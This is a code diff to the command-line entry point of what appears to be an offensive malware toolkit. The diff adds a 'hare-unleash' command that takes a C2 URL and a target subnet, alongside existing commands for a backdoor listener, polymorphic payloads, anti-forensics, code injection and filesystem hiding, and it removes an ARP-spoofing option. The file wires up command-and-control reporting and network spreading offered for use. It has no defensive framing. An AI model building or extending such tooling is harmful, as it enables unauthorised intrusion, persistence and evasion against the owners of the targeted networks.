@@ -21,6 +21,7 @@ from modules.polymorphic_engine import create_polymorphic_payload, generate_encr
 from modules.anti_forensics import scorched_earth
 from modules.ape import unleash_ape
 from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
+from modules.hare import unleash_hare
 import subprocess
 
 def load_config(config_path='config.json'):
@@ -154,6 +155,11 @@ def main():
     ape_parser = subparsers.add_parser("ape-unleash", help="Unleash the APE engine")
     ape_parser.add_argument("--c2-url", required=True, help="C2 URL for the APE to report back to")
     ape_parser.add_argument("--subnet", required=True, help="Initial subnet for the APE to scan")
+
+    # HARE
+    hare_parser = subparsers.add_parser("hare-unleash", help="Unleash the HARE engine")
+    hare_parser.add_argument("--c2-url", required=True, help="C2 URL for the HARE to report back to")
+    hare_parser.add_argument("--subnet", required=True, help="Initial subnet for the HARE to scan")
 
 
     args = parser.parse_args()
@@ -289,9 +295,6 @@ if target_pid:
             for host in results:
                 print(f"IP: {host['ip']}, Ports: {host['open_ports']}, Score: {host['threat_score']}")
 
-        elif args.command == "mitm":
-            start_arp_spoof(args.target, args.gateway)
-
         elif args.command == "backdoor":
             backdoor_listener(args.port, args.password)
 
@@ -327,6 +330,9 @@ if target_pid:
 
         elif args.command == "ape-unleash":
             unleash_ape(args.c2_url, args.subnet)
+
+        elif args.command == "hare-unleash":
+            unleash_hare(args.c2_url, args.subnet)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
